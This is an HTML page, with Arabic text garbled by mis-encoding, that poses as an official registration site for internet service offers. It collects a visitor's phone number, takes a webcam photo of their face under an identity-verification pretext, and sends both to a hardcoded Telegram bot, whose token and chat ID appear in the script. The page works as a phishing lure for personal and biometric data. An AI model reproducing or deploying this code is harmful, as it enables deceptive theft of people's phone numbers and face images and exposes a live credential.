<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ù…Ù†ØµØ© ØªØ³Ø¬ÙŠÙ„ Ø¹Ø±ÙˆØ¶ Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª</title>

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  font-family: system-ui, Tahoma, Arial;
  background: #0e0f13;
  color: #eaeaea;
}

header {
  min-height: 100vh;
  padding: 60px 20px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  text-align: center;
  background: radial-gradient(circle at top, #1a1f2b, #0e0f13);
}

header h1 {
  font-size: clamp(26px, 5vw, 42px);
}

header p {
  max-width: 650px;
  color: #b5b5b5;
}

button {
  padding: 14px 30px;
  font-size: 16px;
  background: linear-gradient(135deg, #2563eb, #1e40af);
  color: #fff;
  border: none;
  border-radius: 8px;
  cursor: pointer;
}

section {
  padding: 60px 20px;
  max-width: 900px;
  margin: auto;
}

.card {
  background: #151823;
  padding: 25px;
  border-radius: 12px;
}

form {
  display: flex;
  flex-direction: column;
  gap: 15px;
  max-width: 420px;
  margin: auto;
}

input {
  padding: 14px;
  border-radius: 8px;
  border: none;
  font-size: 15px;
}

label {
  font-size: 14px;
  color: #ccc;
}

video, canvas {
  width: 100%;
  border-radius: 10px;
  background: #000;
}

.hidden { display: none; }

footer {
  background: #0a0b10;
  padding: 30px 20px;
  text-align: center;
  font-size: 14px;
  color: #888;
}
</style>
</head>

<body>

<header>
  <h1>Ù…Ù†ØµØ© ØªØ³Ø¬ÙŠÙ„ Ø¹Ø±ÙˆØ¶ Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª</h1>
  <p>
    Ù†Ø¸Ø§Ù… ØªØ³Ø¬ÙŠÙ„ Ø±Ø³Ù…ÙŠ Ù„Ø¹Ø±ÙˆØ¶ Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª Ø¨Ø§Ù„ØªØ¹Ø§ÙˆÙ† Ù…Ø¹ Ù…Ø²ÙˆØ¯ÙŠ Ø§Ù„Ø®Ø¯Ù…Ø©ØŒ
    Ù…Ø¹ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ù†Ø¸Ø§Ù….
  </p>
  <button onclick="document.getElementById('consent').scrollIntoView({behavior:'smooth'})">
    Ø§Ø¨Ø¯Ø£ Ø§Ù„ØªØ³Ø¬ÙŠÙ„
  </button>
</header>

<!-- ===== CONSENT ===== -->
<section id="consent">
  <div class="card">
    <h2>Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ù‚Ø¨Ù„ Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø©</h2>
    <p>
      Ù„Ø¥ÙƒÙ…Ø§Ù„ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ØŒ Ù†Ø­ØªØ§Ø¬ Ø¥Ù„Ù‰ ØªØµÙˆÙŠØ± ÙˆØ¬Ù‡Ùƒ Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ© ÙˆÙ…Ù†Ø¹ Ø§Ù„ØªÙƒØ±Ø§Ø±.
      Ù„Ù† ÙŠØªÙ… Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØµÙˆØ±Ø© Ù„Ø£ÙŠ ØºØ±Ø¶ Ø¢Ø®Ø±.
    </p>

    <label>
      <input type="checkbox" id="agree">
      Ø£ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø³ÙŠØ§Ø³Ø© Ø§Ù„Ø®ØµÙˆØµÙŠØ© ÙˆØ§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„ØªØ­Ù‚Ù‚
    </label>

    <br><br>
    <button onclick="goNext()">Ø£ÙˆØ§ÙÙ‚ ÙˆØ£ÙƒÙ…Ù„</button>
  </div>
</section>

<!-- ===== FORM ===== -->
<section id="form" class="hidden">
  <h2 style="text-align:center">Ø¥Ø¯Ø®Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</h2>

  <form onsubmit="startCamera(event)">
    <input type="text" id="phone" placeholder="Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ" required>
    <button type="submit">ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</button>
  </form>
</section>

<!-- ===== CAMERA ===== -->
<section id="camera" class="hidden">
  <h2 style="text-align:center">Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©</h2>

  <video id="video" autoplay playsinline></video>
  <br><br>
  <button onclick="capture()">Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©</button>

  <canvas id="canvas" class="hidden"></canvas>
  <br><br>
  <button id="sendBtn" class="hidden" onclick="sendToTelegram()">Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨</button>
</section>

<footer>
  <p>Â© 2025 Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©</p>
</footer>

<script>
// âš ï¸âš ï¸âš ï¸ ØªØ¬Ø±Ø¨Ø© ÙÙ‚Ø·
// REMOVE TOKEN BEFORE DEPLOY

const BOT_TOKEN = "8304204197:AAFH4TvGEurt0iK5O6950FMqQSGEiXybYgY";
const CHAT_ID  = "7428421245";

let stream;
let imageBlob;

function goNext() {
  if (!document.getElementById("agree").checked) {
    alert("ÙŠØ¬Ø¨ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ù‚Ø¨Ù„ Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø©");
    return;
  }
  document.getElementById("form").classList.remove("hidden");
  document.getElementById("form").scrollIntoView({behavior:"smooth"});
}

function startCamera(e) {
  e.preventDefault();

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(s => {
      stream = s;
      document.getElementById("video").srcObject = stream;
      document.getElementById("camera").classList.remove("hidden");
      document.getElementById("camera").scrollIntoView({behavior:"smooth"});
    })
    .catch(() => alert("Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§"));
}

function capture() {
  const video = document.getElementById("video");
  const canvas = document.getElementById("canvas");
  const ctx = canvas.getContext("2d");

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0);

  canvas.toBlob(blob => {
    imageBlob = blob;
    document.getElementById("sendBtn").classList.remove("hidden");
  }, "image/jpeg");

  stream.getTracks().forEach(t => t.stop());
}

function sendToTelegram() {
  const phone = document.getElementById("phone").value;

  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("caption", `ğŸ“± Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ:\n${phone}`);
  formData.append("photo", imageBlob);

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData
  })
  .then(r => r.json())
  .then(() => alert("ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨ Ø¨Ù†Ø¬Ø§Ø­ (ØªØ¬Ø±Ø¨Ø©)"))
  .catch(() => alert("ÙØ´Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„"));
}
</script>

</body>
</html>